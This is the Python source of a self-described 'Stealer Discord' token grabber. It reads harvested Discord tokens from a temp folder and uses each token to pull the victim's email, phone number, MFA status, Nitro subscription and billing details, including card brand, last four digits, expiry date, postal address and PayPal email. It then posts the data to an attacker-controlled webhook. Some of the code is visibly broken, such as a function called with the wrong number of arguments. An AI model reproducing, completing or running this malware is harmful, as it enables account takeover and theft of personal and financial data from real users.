import requests
from datetime import datetime
import os
import json

user = os.path.expanduser("~")

def SENDEMBED(webhook: str, pathhh: str):
    filepathhh = user + pathhh + "\\discord\\discordTokens.txt"
    lines_seen = set()

    with open(filepathhh, "r") as file:
        lines = file.readlines()

    with open(filepathhh, "w") as file:
        for line in lines:
            if line not in lines_seen:
                file.write(line)
                lines_seen.add(line)
    filepathhh = user + pathhh + "\\AppData\\Local\\Temp\\info\\discord\\discordTokens.txt"
    with open(filepathhh, 'r') as file:
        tttk = file.read()
        
    embed = {
    "username": "🌸 Stealer Discord 🌸",
    "content": "||@everyone||",
    "avatar_url": "https://github.com/yashing2/StealerDiscord/blob/main/OIG3.S8.png?raw=true",
    "embeds": [
        {
            "title": "**🌸 Stealer Discord 🌸**",
            "color": 5639644,
            "fields": [
                {
                    "name": "Discord Information:",
                    "value": f"",
                },
                {
                    "name": "Token discord",
                    "value": f"**`{tttk}`**",
                },
                {
                    "name": "Username",
                    "value": f"**`{user_name}`**",
                },
                {
                    "name": "User ID",
                    "value": f"**`{user_id}`**",
                },
                {
                    "name": "Avatar URL",
                    "value": f"**`{avatar_url}`**",
                },
                {
                    "name": "Phone Number",
                    "value": f"**`{phone_number}`**",
                },
                {
                    "name": "Email",
                    "value": f"**`{email}`**",
                },
                {
                    "name": "A2F (mfa)",
                    "value": f"**`{mfa_enabled}`**",
                },
                {
                    "name": "Verified account",
                    "value": f"**`{verified}`**",
                },
                {
                    "name": "language of account",
                    "value": f"**`{language}`**",
                },
                {
                    "name": "creation date of account",
                    "value": f"**`{creation_date}`**",
                }
            ],
            "footer": {
                "text": "Stealer Discord | Created By yashing2 and VMS_SHOP and phantoms_._",
            },
            "thumbnail": {
                "url": "https://github.com/yashing2/StealerDiscord/blob/main/OIG3.S8.png?raw=true"
            }
        }
    ],
    }
    headers = {
        "Content-Type": "application/json"
    }
    r = requests.post(webhook, json=embed, data=json.dumps(embed), headers=headers)
    
def token_info(token: str, webhook: str):

    languages = {
        'da'    : 'Danish, Denmark',
        'de'    : 'German, Germany',
        'en-GB' : 'English, United Kingdom',
        'en-US' : 'English, United States',
        'es-ES' : 'Spanish, Spain',
        'fr'    : 'French, France',
        'hr'    : 'Croatian, Croatia',
        'lt'    : 'Lithuanian, Lithuania',
        'hu'    : 'Hungarian, Hungary',
        'nl'    : 'Dutch, Netherlands',
        'no'    : 'Norwegian, Norway',
        'pl'    : 'Polish, Poland',
        'pt-BR' : 'Portuguese, Brazilian, Brazil',
        'ro'    : 'Romanian, Romania',
        'fi'    : 'Finnish, Finland',
        'sv-SE' : 'Swedish, Sweden',
        'vi'    : 'Vietnamese, Vietnam',
        'tr'    : 'Turkish, Turkey',
        'cs'    : 'Czech, Czechia, Czech Republic',
        'el'    : 'Greek, Greece',
        'bg'    : 'Bulgarian, Bulgaria',
        'ru'    : 'Russian, Russia',
        'uk'    : 'Ukranian, Ukraine',
        'th'    : 'Thai, Thailand',
        'zh-CN' : 'Chinese, China',
        'ja'    : 'Japanese',
        'zh-TW' : 'Chinese, Taiwan',
        'ko'    : 'Korean, Korea'
    }

    cc_digits = {
        'american express': '3',
        'visa': '4',
        'mastercard': '5'
    }

    headers = {                    
        'Authorization': token,                    
        'Content-Type': 'application/json'                    
    }                    
            
    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)                    

    if res.status_code == 200: # code 200 if valid                    

        res_json = res.json()                    
            
        global user_name
        global user_id
        global avatar_url
        global phone_number
        global email
        global mfa_enabled
        global flags
        global verified
        global language
        global creation_date
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'                    
        user_id = res_json['id']                    
        avatar_id = res_json['avatar']                    
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'                    
        phone_number = res_json['phone']                    
        email = res_json['email']                    
        mfa_enabled = res_json['mfa_enabled']                    
        flags = res_json['flags']                    
        locale = res_json['locale']                    
        verified = res_json['verified']         

        if mfa_enabled == "True":
            mfa_enabled = ":white_check_mark:"
        else:
            mfa_enabled = "❌"

        if verified == "True":
            verified = ":white_check_mark:"
        else:
            verified = "❌"           
                            
        language = languages.get(locale)                    
            
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')                    
            
        has_nitro = False                    
        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)                    
        nitro_data = res.json()                    
        has_nitro = bool(len(nitro_data) > 0)                    
        if has_nitro:                    
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")                    
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")                    
            days_left = abs((d2 - d1).days)                    
            
        # billing info                    
        billing_info = []                    
        for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():                    
            y = x['billing_address']                    
            name = y['name']                    
            address_1 = y['line_1']                    
            address_2 = y['line_2']                    
            city = y['city']                    
            postal_code = y['postal_code']                    
            state = y['state']                    
            country = y['country']                    
            
            if x['type'] == 1:                    
                cc_brand = x['brand']                    
                cc_first = cc_digits.get(cc_brand)                    
                cc_last = x['last_4']                    
                cc_month = str(x['expires_month'])                    
                cc_year = str(x['expires_year'])                    
                                    
                data = {                    
                    'Payment Type': 'Credit Card',                    
                    'Valid': not x['invalid'],                    
                    'CC Holder Name': name,                    
                    'CC Brand': cc_brand.title(),                    
                    'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),                    
                    'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],                    
                    'Address 1': address_1,                    
                    'Address 2': address_2 if address_2 else '',                    
                    'City': city,                    
                    'Postal Code': postal_code,                    
                    'State': state if state else '',                    
                    'Country': country,                    
                    'Default Payment Method': x['default']                    
                }                    
            
            elif x['type'] == 2:                    
                data = {                    
                    'Payment Type': 'PayPal',                    
                    'Valid': not x['invalid'],                    
                    'PayPal Name': name,                    
                    'PayPal Email': x['email'],                    
                    'Address 1': address_1,                    
                    'Address 2': address_2 if address_2 else '',                    
                    'City': city,                    
                    'Postal Code': postal_code,                    
                    'State': state if state else '',                    
                    'Country': country,                    
                    'Default Payment Method': x['default']                    
                }                    

            billing_info.append(data)
            
        SENDEMBED(webhook)